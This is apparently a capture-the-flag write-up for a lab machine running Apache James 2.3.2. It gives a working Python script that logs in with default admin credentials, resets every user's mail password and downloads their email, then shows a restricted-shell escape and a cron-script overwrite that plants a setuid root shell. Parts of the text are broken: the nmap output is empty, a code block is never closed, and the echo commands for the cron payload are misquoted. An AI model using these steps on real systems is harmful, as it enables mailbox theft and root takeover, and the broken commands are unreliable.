This box was fairly easy but it had a new technology I’ve never heard of before called “Apache James”.

If you run a basic nmap with all ports, default scripts, service and OS identification like this nmap -p- -A 10.10.10.51 -vv

you will find the following ports open: 
```
PORT     STATE SERVICE     REASON         VERSION

```

After a quick google for Apache James 2.3.2 exploits we find this the exploit is able to overwrite/create files such as /etc/bash_completion.d with a payload we specify, I tried this out with no luck, pressumably because no one was logged in so th bash completion never triggered.

After studying the exploit I decided to build something to change the smtp passwords of all the users so I could read their email, it look as follows:

```python
import telnetlib
import poplib
import email
import os

user = "root"
password = "root"
host = "10.10.10.51"
port = 4555
tn = telnetlib.Telnet(host,port)
tn.read_until("Login id:")
tn.write(user+"\n")
tn.read_until("Password:")
tn.write(password + "\n")
tn.read_until("commands")
tn.write('listusers\n')
user_count_regex = tn.expect([r"Existing accounts \d"])
user_count = user_count_regex[2]
user_count =  int(user_count.split(" ")[2])

user_list = []
for i in range(0, user_count+1):
    current_user = tn.read_until("\n").replace("user: ","")
    current_user = current_user.strip()
    if current_user != "":
        user_list.append(current_user)
for email_user in user_list:
    print "[+] resetting password of " + email_user
    tn.write("setpassword " + email_user + " highjack\n")
    tn.read_until("reset")
    
    mail = poplib.POP3(host)

    #Login to mail server
    mail.user(email_user)
    mail.pass_("highjack")

    #Get the number of mail messages
    numMessages = len(mail.list()[1])

    print "[+] found %d messages for %s" % (numMessages, email_user)
    current_folder =  os.getcwd()
    print "[+] saving emails to " + current_folder + "/" + email_user
    try:
        os.makedirs(email_user)
    except:
        pass
    for i in range(numMessages):
        for j in mail.retr(i+1)[1]:
            msg = email.message_from_string(j)
            fp = open(email_user+"/"+str(i)+".txt","a")
            fp.write(msg.get_payload())
            fp.close()
```

When we run the script we get the following output:

```bash
[root:~/notes]# python change-passwords.py

[+] found 0 messages for james

Browsing through the downloaded emails we find interesting information included Mindy’s credentials:

```bash
[root:~/notes/john]# cat 0.txt 
John, Can you please restrict mindy's access until she gets read on to the program. Also make sure that you send her a tempory password to login to her accounts.Thank you in advance.Respectfully,James#

[root:~/notes/mindy]# cat 0.txt

[root:~/notes/mindy]# cat 1.txt
Dear Mindy,Here are your ssh credentials to access the system. Remember to reset your password after your first login. Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path. Respectfully,James

```

After logging into ssh as Mindy, we notice that the shell is restrictive bash, luckily for us it’s pretty easy to bypass it:

```bash
mindy@solidstate:~$ echo $SHELL
/bin/rbash

[root:/media/sf_shared/notes]# ssh mindy@10.10.10.51 bash
mindy@10.10.10.51's password: 
python -c 'import pty; pty.spawn("/bin/bash")'  
mindy@solidstate:~$ 
```

While trying to elevate privileges I found a writable file at /opt/tmp.py it’s owned by root and based on the content it looks like the kind of script that would run as a cron to clear out tmp.

```bash
mindy@solidstate:~$ find / -writable -type f 2>/dev/null  
/opt/tmp.py

mindy@solidstate:~$ ls -al /opt/tmp.py
ls -al /opt/tmp.py
-rwxrwxrwx 1 root root 136 Jan 26 17:32 /opt/tmp.py
```
All /opt/tmp.py is wipe out the contents of /tmp this looks like the type of behavior you’d expect in a cronjob, so it makes sense to try to overwrite it with our own script:

```bash
echo 'import os' > /opt/tmp.py
echo 'os.system("cp /bin/sh /tmp/t0") >> /opt/tmp.py'
echo 'os.system("chmod 4755 /tmp/t0") >> /opt/tmp.py'
```

Now we just need to wait for the cronjob to trigger and run our new shell to get root:

```bash
mindy@solidstate:~$ /tmp/t0
/tmp/t0
# id
id
uid=1001(mindy) gid=1001(mindy) euid=0(root) groups=1001(mindy)
# whoami
whoami
root
```
